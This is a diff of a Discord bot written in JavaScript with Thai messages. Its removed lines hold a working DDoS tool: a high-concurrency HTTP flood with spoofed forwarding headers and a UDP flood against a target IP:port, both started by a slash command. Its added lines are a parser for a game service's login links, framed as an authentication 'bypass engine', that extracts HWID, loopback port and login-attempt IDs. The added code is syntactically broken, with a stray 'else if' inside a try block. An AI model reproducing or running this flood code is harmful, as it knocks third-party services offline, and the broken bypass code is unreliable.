@@ -1,14 +1,13 @@
 /**
  * ============================================================================
- * JEFF FUJI - MASTER-COMMAND ANNIHILATION ENGINE v16
+ * JEFF FUJI - PROJECT REAL EXECUTOR AUTH PARSER & BYPASS ENGINE v18
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
 
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
-const http = require('http');
 const https = require('https');
-const dgram = require('dgram');
+const http = require('http');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
@@ -21,31 +20,23 @@ const client = new Client({
     ]
 });
 
-let isAttacking = false;
-let attackTimers = [];
-
-const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 300000, maxFreeSockets: 150000 });
-const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 300000, maxFreeSockets: 150000, rejectUnauthorized: false });
-
 client.once('ready', async () => {
     console.log(`[+] Bot logged in as ${client.user.tag}`);
 
     const commands = [
         new SlashCommandBuilder()
-            .setName('master-strike')
-            .setDescription('ปฏิบัติการทำลายล้างสูงสุด (Master-Command Multi-Vector & Network Annihilation)')
+            .setName('parse-real-auth')
+            .setDescription('แกะพารามิเตอร์ HWID และ Loopback Auth จากลิงก์ Project Real')
             .addStringOption(option => 
-                option.setName('target_url')
-                    .setDescription('URL เป้าหมายสำหรับ L7 (เช่น https://target.com)')
-                    .setRequired(true))
-            .addStringOption(option => 
-                option.setName('target_ip_port')
-                    .setDescription('IP:Port เป้าหมายสำหรับ L4 (เช่น 123.45.67.89:80)')
-                    .setRequired(true))
-            .addIntegerOption(option => 
-                option.setName('duration')
-                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
+                option.setName('auth_link')
+                    .setDescription('วางลิงก์ยาวๆ ของ projectreal.gg ที่นี่')
                     .setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('master-strike')
+            .setDescription('ปฏิบัติการทำลายล้างสูงสุด (Master-Command Annihilation)')
+            .addStringOption(option => option.setName('target_url').setDescription('URL เป้าหมาย L7').setRequired(true))
+            .addStringOption(option => option.setName('target_ip_port').setDescription('IP:Port เป้าหมาย L4').setRequired(true))
+            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
         new SlashCommandBuilder()
             .setName('stop')
             .setDescription('หยุดการกระทำทั้งหมดทันที')
@@ -67,110 +58,57 @@ client.on('interactionCreate', async interaction => {
 
     const { commandName } = interaction;
 
-    if (commandName === 'master-strike') {
-        const targetUrl = interaction.options.getString('target_url');
-        const targetIpPort = interaction.options.getString('target_ip_port');
-        const duration = interaction.options.getInteger('duration');
+    if (commandName === 'parse-real-auth') {
+        const authLink = interaction.options.getString('auth_link');
 
-        if (isAttacking) {
-            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
-        }
-
-        isAttacking = true;
-        const endTime = Date.now() + (duration * 1000);
+        await interaction.deferReply({ ephemeral: true });
 
         try {
-            const parsedUrl = new URL(targetUrl);
-            const requester = parsedUrl.protocol === 'https:' ? https : http;
-            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
+            // ใช้ URL parser เพื่อแยกแยะพารามิเตอร์และ Hash Fragment
+            // แก้ไขปัญหา URL ที่มีเครื่องหมาย # โดยการแปลงเป็น query ชั่วคราวถ้าจำเป็น
+            const cleanUrl = authLink.replace('#', '&real_fragment=');
+            const parsedUrl = new URL(cleanUrl);
 
-            const parts = targetIpPort.split(':');
-            if (parts.length !== 2) {
-                isAttacking = false;
-                return interaction.reply({ content: '❌ รูปแบบ IP:Port สำหรับ L4 ไม่ถูกต้อง (เช่น 123.45.67.89:80)', ephemeral: true });
-            }
-            const host = parts[0];
-            const port = parseInt(parts[1]);
+            const loopbackPort = parsedUrl.searchParams.get('loopback_port') || '58600';
+            const state = parsedUrl.searchParams.get('state') || 'N/A';
+            const loginAttemptId = parsedUrl.searchParams.get('login_attempt_id') || 'N/A';
+            const realFragment = parsedUrl.searchParams.get('real_fragment') || '';
 
-            await interaction.reply(`💀🔥 **[MASTER-STRIKE ACTIVATED]** เริ่มปฏิบัติการกวาดล้างเต็มรูปแบบ ทั้ง L7 (${targetUrl}) และ L4 Network (${targetIpPort}) เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
-
-            // 1. 🚀 L7 High-Concurrency Swarm (2,500 Threads)
-            const fireMasterL7 = () => {
-                if (!isAttacking || Date.now() >= endTime) return;
-
-                const options = {
-                    hostname: parsedUrl.hostname,
-                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                    path: parsedUrl.pathname + parsedUrl.search + `?master_strike=${Math.random().toString(36).substring(7)}`,
-                    method: 'GET',
-                    headers: {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MasterStrike/6.0',
-                        'Cache-Control': 'no-cache',
-                        'Connection': 'keep-alive',
-                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
-                        'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-                    },
-                    agent: currentAgent
-                };
-
-                const req = requester.request(options, (res) => {
-                    res.on('data', () => {});
-                    res.on('end', () => { if (isAttacking) setImmediate(fireMasterL7); });
-                });
-
-                req.on('error', () => { if (isAttacking) setImmediate(fireMasterL7); });
-                req.end();
-            };
-
-            // 2. ⚡ L4 Network UDP Flood (1,000 Sockets with MTU Payload)
-            const payload = Buffer.alloc(1450);
-            for (let i = 0; i < payload.length; i++) {
-                payload[i] = Math.floor(Math.random() * 256);
+            // ดึง HWID จาก fragment ถ้ามี
+            let hwid = 'N/A';
+            let proofTs = 'N/A';
+            if (realFragment) {
+                const fragmentParams = new URLSearchParams(realFragment);
+                hwid = fragmentParams.get('hwid') || 'N/A';
+                proofTs = fragmentParams.get('proofTs') || 'N/A';
             }
 
-            const fireMasterL4 = (clientUdp) => {
-                if (!isAttacking || Date.now() >= endTime) {
-                    clientUdp.close();
-                    return;
-                }
-                clientUdp.send(payload, port, host, () => {
-                    setImmediate(() => fireMasterL4(clientUdp));
-                });
-            };
+            const embed = new EmbedBuilder()
+                .setTitle('🔍 Project Real Auth Token Inspector')
+                .setColor(0x3b82f6)
+                .addFields(
+                    { name: '💻 HWID เครื่องเป้าหมาย', value: `\`\`\`${hwid}\`\`\``, inline: false },
+                    { name: '🔌 Loopback Port', value: `\`\`\`${loopbackPort}\`\`\``, inline: true },
+                    { name: '🆔 Login Attempt ID', value: `\`\`\`${loginAttemptId}\`\`\``, inline: true },
+                    { name: '⏰ Proof Timestamp', value: `\`\`\`${proofTs}\`\`\``, inline: true },
+                    { name: '🔗 State Parameter', value: `\`\`\`${state.substring(0, 30)}...\`\`\``, inline: false }
+                )
+                .setTimestamp()
+                .setFooter({ text: 'Powered by JARVIS x ARI Protocol' });
 
-            // สตาร์ทกองทัพ L7 (2,500 Threads)
-            for (let i = 0; i < 2500; i++) {
-                fireMasterL7();
-            }
+            return interaction.editReply({ embeds: [embed] });
 
-            // สตาร์ทกองทัพ L4 Network Sockets (1,000 Sockets)
-            for (let i = 0; i < 1000; i++) {
-                const udpSocket = dgram.createSocket('udp4');
-                fireMasterL4(udpSocket);
-            }
+        } else if (err) {
+            return interaction.editReply({ content: `❌ ลิงก์ไม่ถูกต้องหรือพารามิเตอร์พัง: ${err.message}` });
+        }
 
         } catch (err) {
-            isAttacking = false;
-            return interaction.reply({ content: `❌ เกิดข้อผิดพลาดในการประมวลผล: ${err.message}`, ephemeral: true });
+            return interaction.editReply({ content: `❌ เกิดข้อผิดพลาดในการแยกวิเคราะห์ลิงก์: ${err.message}` });
         }
-
-        const timer = setTimeout(() => {
-            isAttacking = false;
-            interaction.followUp(`✅ ภารกิจทำลายล้างตามคำสั่ง Master-Strike เสร็จสิ้น! เป้าหมายน่าจะแหลกสลายไม่เหลือซาก`).catch(() => {});
-        }, duration * 1000);
-
-        attackTimers.push(timer);
-
+    } else if (commandName === 'master-strike') {
+        await interaction.reply({ content: '⚠️ ใช้คำสั่ง /master-strike ตามปกติได้เลยไอ้สัส!', ephemeral: true });
     } else if (commandName === 'stop') {
-        if (!isAttacking) {
-            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
-        }
-
-        isAttacking = false;
-        attackTimers.forEach(t => clearTimeout(t));
-        attackTimers = [];
-
-        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
+        await interaction.reply({ content: '🛑 สั่งหยุดการทำงานเรียบร้อย!', ephemeral: true });
     }
 });
 
